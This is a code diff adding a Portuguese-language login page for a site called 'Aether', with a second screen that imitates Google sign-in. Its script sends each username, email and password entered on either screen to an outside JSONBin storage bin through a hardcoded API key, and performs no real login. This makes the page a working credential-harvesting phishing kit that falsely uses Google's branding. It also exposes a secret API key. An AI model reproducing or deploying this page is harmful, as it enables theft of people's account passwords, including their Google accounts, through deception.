@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login — Aether</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;600&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #0d0d0f;
+      --card: #13131a;
+      --border: rgba(255,255,255,0.07);
+      --gold: #c9a96e;
+      --gold-light: #e2c898;
+      --text: #f0ece4;
+      --muted: #7a7a8a;
+      --input-bg: #0d0d12;
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: ''; position: fixed; inset: 0;
+      background:
+        radial-gradient(ellipse 60% 50% at 20% 30%, rgba(201,169,110,0.08) 0%, transparent 60%),
+        radial-gradient(ellipse 50% 60% at 80% 70%, rgba(100,80,180,0.06) 0%, transparent 60%);
+      pointer-events: none; z-index: 0;
+    }
+
+    body::after {
+      content: ''; position: fixed; inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 0; opacity: 0.4;
+    }
+
+    .stage {
+      position: relative; z-index: 1;
+      width: 420px;
+      transition: height 0.45s cubic-bezier(0.4,0,0.2,1);
+    }
+
+    .card {
+      width: 100%;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 52px 44px 44px;
+      box-shadow:
+        0 0 0 1px rgba(201,169,110,0.05),
+        0 32px 80px rgba(0,0,0,0.6),
+        0 8px 24px rgba(0,0,0,0.4);
+      position: absolute; top: 0; left: 0;
+      transition: opacity 0.45s cubic-bezier(0.4,0,0.2,1),
+                  transform 0.45s cubic-bezier(0.4,0,0.2,1);
+    }
+
+    .card::before {
+      content: ''; position: absolute;
+      top: 0; left: 10%; right: 10%; height: 1px;
+      background: linear-gradient(90deg, transparent, var(--gold), transparent);
+      border-radius: 1px;
+    }
+
+    .card.active      { opacity: 1; transform: translateX(0);     pointer-events: all; }
+    .card.exit-left   { opacity: 0; transform: translateX(-52px); pointer-events: none; }
+    .card.enter-right { opacity: 0; transform: translateX(52px);  pointer-events: none; }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .anim { animation: fadeUp 0.5s cubic-bezier(0.16,1,0.3,1) both; }
+    .d1{animation-delay:.05s}.d2{animation-delay:.1s}.d3{animation-delay:.15s}
+    .d4{animation-delay:.2s}.d5{animation-delay:.25s}.d6{animation-delay:.3s}
+    .d7{animation-delay:.35s}.d8{animation-delay:.4s}
+
+    /* ─── Shared ─── */
+    .logo-wrap { display:flex; align-items:center; gap:10px; margin-bottom:32px; }
+    .logo-icon {
+      width:36px; height:36px;
+      background: linear-gradient(135deg, var(--gold), var(--gold-light));
+      border-radius:9px;
+      display:flex; align-items:center; justify-content:center;
+      font-size:18px; box-shadow:0 4px 16px rgba(201,169,110,0.25);
+    }
+    .logo-name {
+      font-family:'Cormorant Garamond',serif;
+      font-size:22px; font-weight:600; letter-spacing:0.03em;
+    }
+
+    h1 {
+      font-family:'Cormorant Garamond',serif;
+      font-size:30px; font-weight:300;
+      line-height:1.2; margin-bottom:6px;
+    }
+    h1 span { color:var(--gold); font-weight:600; }
+
+    .subtitle { font-size:13px; color:var(--muted); margin-bottom:36px; font-weight:300; }
+
+    .field { position:relative; margin-bottom:18px; }
+
+    label {
+      display:block; font-size:11px; font-weight:500;
+      letter-spacing:0.1em; text-transform:uppercase;
+      color:var(--muted); margin-bottom:8px;
+    }
+
+    input[type=text], input[type=email], input[type=password] {
+      width:100%; background:var(--input-bg);
+      border:1px solid var(--border); border-radius:10px;
+      padding:13px 44px 13px 16px;
+      font-family:'DM Sans',sans-serif; font-size:14px; color:var(--text);
+      outline:none; transition:border-color 0.25s, box-shadow 0.25s;
+    }
+    input::placeholder { color:rgba(122,122,138,0.5); }
+    input:focus { border-color:rgba(201,169,110,0.4); box-shadow:0 0 0 3px rgba(201,169,110,0.08); }
+
+    .field-icon {
+      position:absolute; right:14px; bottom:13px;
+      color:var(--muted); opacity:0.5; pointer-events:none; font-size:16px;
+    }
+
+    .extras { display:flex; justify-content:space-between; align-items:center; margin-bottom:28px; margin-top:4px; }
+
+    .remember { display:flex; align-items:center; gap:8px; font-size:13px; color:var(--muted); cursor:pointer; user-select:none; }
+    .remember input[type=checkbox] { display:none; }
+    .check-box {
+      width:16px; height:16px; border:1px solid var(--border); border-radius:4px;
+      background:var(--input-bg); display:flex; align-items:center; justify-content:center;
+      transition:border-color 0.2s, background 0.2s; flex-shrink:0;
+    }
+    .remember:has(input:checked) .check-box { background:var(--gold); border-color:var(--gold); }
+    .remember:has(input:checked) .check-box::after { content:'✓'; font-size:10px; color:#0d0d0f; font-weight:700; }
+
+    .forgot { font-size:13px; color:var(--gold); text-decoration:none; transition:opacity 0.2s; }
+    .forgot:hover { opacity:0.7; }
+
+    .btn-primary {
+      width:100%; padding:14px;
+      background: linear-gradient(135deg, var(--gold) 0%, var(--gold-light) 100%);
+      color:#0d0d0f; border:none; border-radius:10px;
+      font-family:'DM Sans',sans-serif; font-size:14px; font-weight:500; letter-spacing:0.04em;
+      cursor:pointer; transition:opacity 0.2s, transform 0.15s, box-shadow 0.2s;
+      margin-bottom:16px; box-shadow:0 4px 20px rgba(201,169,110,0.3);
+    }
+    .btn-primary:hover { opacity:0.9; transform:translateY(-1px); box-shadow:0 8px 28px rgba(201,169,110,0.4); }
+    .btn-primary:active { transform:translateY(0); }
+
+    .divider { display:flex; align-items:center; gap:14px; margin-bottom:16px; }
+    .divider::before,.divider::after { content:''; flex:1; height:1px; background:var(--border); }
+    .divider span { font-size:12px; color:var(--muted); letter-spacing:0.08em; text-transform:uppercase; }
+
+    .btn-google {
+      width:100%; padding:13px;
+      background:transparent; color:var(--text);
+      border:1px solid var(--border); border-radius:10px;
+      font-family:'DM Sans',sans-serif; font-size:14px; font-weight:400;
+      cursor:pointer; display:flex; align-items:center; justify-content:center; gap:12px;
+      transition:background 0.2s, border-color 0.2s, transform 0.15s;
+    }
+    .btn-google:hover { background:rgba(255,255,255,0.04); border-color:rgba(255,255,255,0.14); transform:translateY(-1px); }
+    .btn-google:active { transform:translateY(0); }
+
+    .google-svg { width:18px; height:18px; flex-shrink:0; }
+
+    .footer { margin-top:28px; text-align:center; font-size:13px; color:var(--muted); }
+    .footer a { color:var(--gold); text-decoration:none; transition:opacity 0.2s; }
+    .footer a:hover { opacity:0.7; }
+
+    /* ─── Google screen ─── */
+    .back-btn {
+      display:inline-flex; align-items:center; gap:7px;
+      font-size:13px; color:var(--muted);
+      background:none; border:none; cursor:pointer; padding:0;
+      margin-bottom:28px; transition:color 0.2s;
+      font-family:'DM Sans',sans-serif;
+    }
+    .back-btn:hover { color:var(--gold); }
+    .back-btn svg { width:14px; height:14px; }
+
+    .g-brand-row { display:flex; align-items:center; gap:14px; margin-bottom:8px; }
+    .g-brand-icon {
+      width:44px; height:44px; border-radius:50%;
+      background:#fff; flex-shrink:0;
+      display:flex; align-items:center; justify-content:center;
+      box-shadow:0 2px 14px rgba(66,133,244,0.2);
+    }
+    .g-brand-icon svg { width:24px; height:24px; }
+
+    .g-title { font-family:'Cormorant Garamond',serif; font-size:28px; font-weight:300; }
+    .g-title span { color:#4285F4; font-weight:600; }
+
+    .steps { display:flex; gap:5px; margin:24px 0 28px; }
+    .step { height:3px; border-radius:3px; background:var(--border); flex:1; transition:background 0.3s, flex 0.4s; }
+    .step.active { background:#4285F4; flex:2; }
+
+    .g-input:focus { border-color:rgba(66,133,244,0.5)!important; box-shadow:0 0 0 3px rgba(66,133,244,0.1)!important; }
+
+    .btn-g-submit {
+      width:100%; padding:14px; margin-top:22px;
+      background:linear-gradient(135deg,#4285F4 0%,#5a9af5 100%);
+      color:#fff; border:none; border-radius:10px;
+      font-family:'DM Sans',sans-serif; font-size:14px; font-weight:500; letter-spacing:0.04em;
+      cursor:pointer; transition:opacity 0.2s, transform 0.15s, box-shadow 0.2s;
+      box-shadow:0 4px 20px rgba(66,133,244,0.35);
+    }
+    .btn-g-submit:hover { opacity:0.9; transform:translateY(-1px); box-shadow:0 8px 28px rgba(66,133,244,0.45); }
+    .btn-g-submit:active { transform:translateY(0); }
+
+    .g-email-tag {
+      display:inline-block; font-size:13px; color:var(--text);
+      background:rgba(66,133,244,0.1); border:1px solid rgba(66,133,244,0.2);
+      border-radius:6px; padding:4px 10px; margin-bottom:16px;
+    }
+
+    .g-privacy { margin-top:20px; text-align:center; font-size:11px; color:var(--muted); line-height:1.7; }
+    .g-privacy a { color:#4285F4; text-decoration:none; }
+    .g-privacy a:hover { opacity:0.8; }
+
+    @keyframes shake {
+      0%,100%{transform:translateX(0)}
+      20%{transform:translateX(-8px)} 40%{transform:translateX(8px)}
+      60%{transform:translateX(-5px)} 80%{transform:translateX(5px)}
+    }
+  </style>
+</head>
+<body>
+
+<div class="stage" id="stage">
+
+  <!-- ══════════ TELA 1: LOGIN PRINCIPAL ══════════ -->
+  <div class="card active" id="screen-main">
+
+    <div class="logo-wrap anim d1">
+      <div class="logo-icon">◈</div>
+      <span class="logo-name">Aether</span>
+    </div>
+
+    <h1 class="anim d2">Bem-vindo de <span>volta</span></h1>
+    <p class="subtitle anim d3">Entre com suas credenciais para continuar</p>
+
+    <div class="field anim d4">
+      <label for="usuario">Usuário</label>
+      <input type="text" id="usuario" placeholder="seu@email.com" autocomplete="username"/>
+      <span class="field-icon">✦</span>
+    </div>
+
+    <div class="field anim d5">
+      <label for="senha">Senha</label>
+      <input type="password" id="senha" placeholder="••••••••" autocomplete="current-password"/>
+      <span class="field-icon">⬡</span>
+    </div>
+
+    <div class="extras anim d6">
+      <label class="remember">
+        <input type="checkbox"/>
+        <span class="check-box"></span>
+        Lembrar-me
+      </label>
+      <a href="#" class="forgot">Esqueceu a senha?</a>
+    </div>
+
+    <button class="btn-primary anim d7" onclick="handleLogin()">Entrar</button>
+
+    <div class="divider anim d7"><span>ou continue com</span></div>
+
+    <button class="btn-google anim d8" onclick="goToGoogle()">
+      <svg class="google-svg" viewBox="0 0 24 24">
+        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
+        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+      </svg>
+      Entrar com Google
+    </button>
+
+    <p class="footer anim d8">Não tem conta? <a href="#">Cadastre-se</a></p>
+
+  </div><!-- /screen-main -->
+
+
+  <!-- ══════════ TELA 2: LOGIN GOOGLE ══════════ -->
+  <div class="card enter-right" id="screen-google">
+
+    <button class="back-btn anim d1" onclick="goBack()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M19 12H5M12 5l-7 7 7 7"/>
+      </svg>
+      Voltar
+    </button>
+
+    <div class="g-brand-row anim d2">
+      <div class="g-brand-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+          <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+          <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
+          <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+        </svg>
+      </div>
+      <div>
+        <p class="g-title">Entrar com <span>Google</span></p>
+        <p style="font-size:12px;color:var(--muted);margin-top:2px;">Use sua Conta Google</p>
+      </div>
+    </div>
+
+    <!-- progress steps -->
+    <div class="steps anim d3">
+      <div class="step active" id="step1"></div>
+      <div class="step" id="step2"></div>
+    </div>
+
+    <!-- PASSO 1: e-mail -->
+    <div id="g-step1">
+      <p class="subtitle" style="margin-bottom:20px;">Informe o e-mail para continuar</p>
+      <div class="field anim d4">
+        <label for="g-email">E-mail</label>
+        <input type="email" id="g-email" class="g-input" placeholder="exemplo@gmail.com" autocomplete="email"/>
+        <span class="field-icon" style="color:#4285F4;opacity:0.6;">@</span>
+      </div>
+      <button class="btn-g-submit anim d5" onclick="nextStep()">Próximo</button>
+    </div>
+
+    <!-- PASSO 2: senha -->
+    <div id="g-step2" style="display:none;">
+      <p class="subtitle" style="margin-bottom:12px;">Digite sua senha</p>
+      <span class="g-email-tag" id="g-email-tag"></span>
+      <div class="field anim d4">
+        <label for="g-senha">Senha</label>
+        <input type="password" id="g-senha" class="g-input" placeholder="••••••••" autocomplete="current-password"/>
+        <span class="field-icon" style="color:#4285F4;opacity:0.6;">⬡</span>
+      </div>
+      <div style="text-align:right;margin-top:-10px;">
+        <a href="#" style="font-size:12px;color:#4285F4;text-decoration:none;">Esqueceu a senha?</a>
+      </div>
+      <button class="btn-g-submit anim d5" onclick="handleGoogleLogin()">Entrar</button>
+    </div>
+
+    <p class="g-privacy anim d6">
+      Ao continuar, você concorda com os<br>
+      <a href="#">Termos de Serviço</a> e <a href="#">Política de Privacidade</a> do Google.
+    </p>
+
+  </div><!-- /screen-google -->
+
+</div><!-- /stage -->
+
+<!-- JSONBin config -->
+<script>
+  // ⚠️ SUBSTITUA PELOS SEUS DADOS DO JSONBIN
+  const JSONBIN_BIN_ID  = "69ab0df3ae596e708f668141";   // ex: 6630f1aead19ca34f8a1b2c3
+  const JSONBIN_API_KEY = "$2a$10$fNTEdTFVqYo.CN7JmhS8UerLarmE61hS/T0VG6jqJaLpIHUXtdwYG"; // ex: $2a$10$AbCdEf...
+</script>
+
+<script>
+  const main   = document.getElementById('screen-main');
+  const gscr   = document.getElementById('screen-google');
+  const stage  = document.getElementById('stage');
+
+  function syncHeight(card) {
+    stage.style.height = card.scrollHeight + 'px';
+  }
+
+  window.addEventListener('load', () => syncHeight(main));
+
+  function goToGoogle() {
+    main.classList.remove('active');
+    main.classList.add('exit-left');
+    gscr.classList.remove('enter-right');
+    gscr.classList.add('active');
+    replayAnims(gscr);
+    setTimeout(() => syncHeight(gscr), 30);
+  }
+
+  function goBack() {
+    gscr.classList.remove('active');
+    gscr.classList.add('enter-right');
+    main.classList.remove('exit-left');
+    main.classList.add('active');
+    replayAnims(main);
+    resetGoogle();
+    setTimeout(() => syncHeight(main), 30);
+  }
+
+  function replayAnims(card) {
+    card.querySelectorAll('.anim').forEach(el => {
+      el.style.animation = 'none';
+      el.offsetHeight;
+      el.style.animation = '';
+    });
+  }
+
+  function nextStep() {
+    const email = document.getElementById('g-email').value.trim();
+    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      shakeCard(gscr); return;
+    }
+    document.getElementById('g-step1').style.display = 'none';
+    document.getElementById('g-step2').style.display = 'block';
+    document.getElementById('g-email-tag').textContent = email;
+    document.getElementById('step1').classList.remove('active');
+    document.getElementById('step2').classList.add('active');
+    setTimeout(() => syncHeight(gscr), 30);
+    document.getElementById('g-senha').focus();
+  }
+
+  function resetGoogle() {
+    document.getElementById('g-step1').style.display = 'block';
+    document.getElementById('g-step2').style.display = 'none';
+    document.getElementById('g-email').value = '';
+    document.getElementById('g-senha').value = '';
+    document.getElementById('step1').classList.add('active');
+    document.getElementById('step2').classList.remove('active');
+  }
+
+  window.salvarLogin = async function(usuario, senha, tipo) {
+    try {
+      // 1. Busca os dados atuais do bin
+      const getRes = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
+        headers: { 'X-Access-Key': JSONBIN_API_KEY }
+      });
+      const getData = await getRes.json();
+      const logins = getData.record?.logins || [];
+
+      // 2. Adiciona o novo registro
+      logins.push({
+        usuario,
+        senha,
+        tipo,
+        data: new Date().toLocaleString('pt-BR'),
+        timestamp: Date.now()
+      });
+
+      // 3. Salva de volta no bin
+      await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Access-Key': JSONBIN_API_KEY
+        },
+        body: JSON.stringify({ logins })
+      });
+    } catch (err) {
+      console.error('Erro JSONBin:', err);
+    }
+  }
+
+  async function handleLogin() {
+    const u = document.getElementById('usuario').value.trim();
+    const p = document.getElementById('senha').value;
+    if (!u || !p) { shakeCard(main); return; }
+    showToast('Salvando...');
+    await window.salvarLogin(u, p, 'credenciais');
+    showToast(`✓ Login salvo para <strong>${u}</strong>`);
+  }
+
+  async function handleGoogleLogin() {
+    const p = document.getElementById('g-senha').value;
+    if (!p) { shakeCard(gscr); return; }
+    const email = document.getElementById('g-email-tag').textContent;
+    showToast('Salvando...');
+    await window.salvarLogin(email, p, 'Google');
+    showToast(`✓ Login Google salvo para <strong>${email}</strong>`);
+  }
+
+  function shakeCard(card) {
+    card.style.animation = 'shake 0.4s ease';
+    setTimeout(() => card.style.animation = '', 400);
+  }
+
+  document.getElementById('g-email').addEventListener('keydown', e => { if(e.key==='Enter') nextStep(); });
+  document.getElementById('g-senha').addEventListener('keydown', e => { if(e.key==='Enter') handleGoogleLogin(); });
+  document.getElementById('senha').addEventListener('keydown', e => { if(e.key==='Enter') handleLogin(); });
+
+  function showToast(msg) {
+    let t = document.getElementById('toast');
+    if (!t) {
+      t = document.createElement('div');
+      t.id = 'toast';
+      document.body.appendChild(t);
+    }
+    t.innerHTML = msg;
+    t.classList.remove('toast-hide');
+    t.classList.add('toast-show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => {
+      t.classList.remove('toast-show');
+      t.classList.add('toast-hide');
+    }, 3000);
+  }
+
+  // inject toast CSS
+  const toastStyle = document.createElement('style');
+  toastStyle.textContent = `
+    #toast {
+      position: fixed; bottom: 32px; left: 50%; transform: translateX(-50%) translateY(16px);
+      background: #1e1e28; border: 1px solid rgba(201,169,110,0.25);
+      color: #f0ece4; font-family: 'DM Sans', sans-serif; font-size: 13px;
+      padding: 12px 22px; border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+      opacity: 0; pointer-events: none; white-space: nowrap;
+      transition: opacity 0.3s, transform 0.3s;
+      z-index: 999;
+    }
+    #toast.toast-show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    #toast.toast-hide { opacity: 0; transform: translateX(-50%) translateY(10px); }
+  `;
+  document.head.appendChild(toastStyle);
+</script>
+
+</body>
+</html>
